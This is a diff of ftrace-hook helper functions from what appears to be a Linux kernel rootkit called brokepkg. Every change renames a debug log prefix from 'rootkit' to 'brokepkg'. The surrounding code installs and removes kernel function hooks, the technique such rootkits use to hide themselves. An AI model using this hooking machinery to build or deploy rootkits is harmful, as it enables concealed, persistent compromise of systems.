@@ -22,7 +22,7 @@ int fh_resolve_hook_address(struct ftrace_hook *hook) {
 
   if (!hook->address) {
 #ifdef DEBUG
-    printk(KERN_DEBUG "rootkit: unresolved symbol: %s\n", hook->name);
+    printk(KERN_DEBUG "brokepkg: unresolved symbol: %s\n", hook->name);
 #endif
     return -ENOENT;
   }
@@ -60,7 +60,7 @@ int fh_install_hook(struct ftrace_hook *hook) {
   err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
   if (err) {
 #ifdef DEBUG
-    printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
+    printk(KERN_DEBUG "brokepkg: ftrace_set_filter_ip() failed: %d\n", err);
 #endif
     return err;
   }
@@ -68,7 +68,7 @@ int fh_install_hook(struct ftrace_hook *hook) {
   err = register_ftrace_function(&hook->ops);
   if (err) {
 #ifdef DEBUG
-    printk(KERN_DEBUG "rootkit: register_ftrace_function() failed: %d\n", err);
+    printk(KERN_DEBUG "brokepkg: register_ftrace_function() failed: %d\n", err);
 #endif
     return err;
   }
@@ -81,7 +81,7 @@ void fh_remove_hook(struct ftrace_hook *hook) {
   err = unregister_ftrace_function(&hook->ops);
 #ifdef DEBUG
   if (err) {
-    printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n",
+    printk(KERN_DEBUG "brokepkg: unregister_ftrace_function() failed: %d\n",
            err);
   }
 #endif
@@ -89,7 +89,7 @@ void fh_remove_hook(struct ftrace_hook *hook) {
   err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
   if (err) {
 #ifdef DEBUG
-    printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
+    printk(KERN_DEBUG "brokepkg: ftrace_set_filter_ip() failed: %d\n", err);
 #endif
   }
 }
